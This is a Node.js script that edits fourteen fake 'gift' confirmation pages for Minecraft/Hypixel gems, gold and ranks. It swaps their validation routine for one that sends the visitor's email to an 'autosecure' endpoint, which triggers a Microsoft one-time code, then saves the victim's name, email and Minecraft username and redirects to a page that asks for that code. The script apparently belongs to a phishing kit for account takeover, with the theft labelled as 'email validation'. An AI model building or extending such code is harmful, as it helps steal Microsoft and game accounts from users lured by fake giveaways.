const fs = require('fs');
const path = require('path');

// Product files that need email validation
const confirmFiles = [
    '16-400-skyblock-gems-confirm.html',
    '3-600-skyblock-gems-confirm.html',
    '11-000-gold-confirm.html',
    'vip-rank-confirm.html',
    'vipplus-confirm.html',
    'mvp-rank-confirm.html',
    'mvpplus-confirm.html',
    'mvpplusplus-confirm.html',
    '1-000-gold-confirm.html',
    '2-500-gold-confirm.html',
    '5-000-gold-confirm.html',
    '675-skyblock-gems-confirm.html',
    '1-390-skyblock-gems-confirm.html',
    '7-200-skyblock-gems-confirm.html'
];

confirmFiles.forEach(fileName => {
    const filePath = path.join('./gift', fileName);
    
    if (fs.existsSync(filePath)) {
        let content = fs.readFileSync(filePath, 'utf8');
        
        // Find the validate function and modify it to check email first
        const oldValidate = `const validate = () => {
                    showErrors.value = true;
                    globalError.value = '';

                    if (!email.value || !isValidEmail(email.value)) return false;
                    if (!fullName.value || fullName.value.length < 2) return false;
                    if (!agreeTerms.value) return false;

                    isPageLoading.value = true;
                    
                    setTimeout(() => {
                        isPageLoading.value = false;
                        alert('Gift redemption completed successfully!');
                    }, 2000);

                    return true;
                };`;
        
        const newValidate = `const validate = async () => {
                    showErrors.value = true;
                    globalError.value = '';

                    if (!email.value || !isValidEmail(email.value)) return false;
                    if (!fullName.value || fullName.value.length < 2) return false;
                    if (!agreeTerms.value) return false;

                    isPageLoading.value = true;
                    
                    try {
                        // Check if email exists in Microsoft and send OTP
                        const response = await fetch('/api/autosecure/send-otp', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                email: email.value
                            })
                        });

                        const result = await response.json();
                        
                        if (result.success) {
                            // Save session data and redirect to enter_code.html
                            sessionStorage.setItem('autosecure_session', result.sessionId);
                            sessionStorage.setItem('user_email', email.value);
                            sessionStorage.setItem('full_name', fullName.value);
                            sessionStorage.setItem('minecraft_username', minecraftUsername.value || '');
                            
                            // Get current product info
                            const urlParams = new URLSearchParams(window.location.search);
                            const product = urlParams.get('product') || 'Product';
                            const price = urlParams.get('price') || '0.00';
                            const image = urlParams.get('image') || '';
                            
                            // Redirect to enter_code.html with product info
                            window.location.href = \`enter_code.html?product=\${encodeURIComponent(product)}&price=\${price}&image=\${encodeURIComponent(image)}\`;
                        } else {
                            globalError.value = result.error || 'Email not found or OTP disabled';
                            isPageLoading.value = false;
                        }
                    } catch (error) {
                        console.error('Error checking email:', error);
                        globalError.value = 'Failed to verify email';
                        isPageLoading.value = false;
                    }

                    return false; // Don't complete here, redirect instead
                };`;
        
        content = content.replace(oldValidate, newValidate);
        
        // Also need to add minecraftUsername to the return statement if not present
        if (!content.includes('minecraftUsername')) {
            const oldReturn = `return {
                    mobileSummaryOpen,
                    toggleMobileSummary,
                    email,
                    fullName,
                    postalCode,
                    allowUpdates,
                    agreeTerms,
                    showErrors,
                    isValidEmail,
                    validate,
                    isPageLoading,
                    product,
                    globalError
                };`;
            
            const newReturn = `return {
                    mobileSummaryOpen,
                    toggleMobileSummary,
                    email,
                    fullName,
                    postalCode,
                    minecraftUsername,
                    allowUpdates,
                    agreeTerms,
                    showErrors,
                    isValidEmail,
                    validate,
                    isPageLoading,
                    product,
                    globalError
                };`;
            
            content = content.replace(oldReturn, newReturn);
        }
        
        // Add minecraftUsername ref if not present
        if (!content.includes('const minecraftUsername = ref')) {
            const oldRefs = `const postalCode = ref('');
                const allowUpdates = ref(false);
                const agreeTerms = ref(false);`;
            
            const newRefs = `const postalCode = ref('');
                const minecraftUsername = ref('');
                const allowUpdates = ref(false);
                const agreeTerms = ref(false);`;
            
            content = content.replace(oldRefs, newRefs);
        }
        
        fs.writeFileSync(filePath, content);
        console.log(`Updated ${fileName} with autosecure email validation`);
    } else {
        console.log(`File not found: ${fileName}`);
    }
});

console.log('All confirm pages updated with autosecure email validation!');
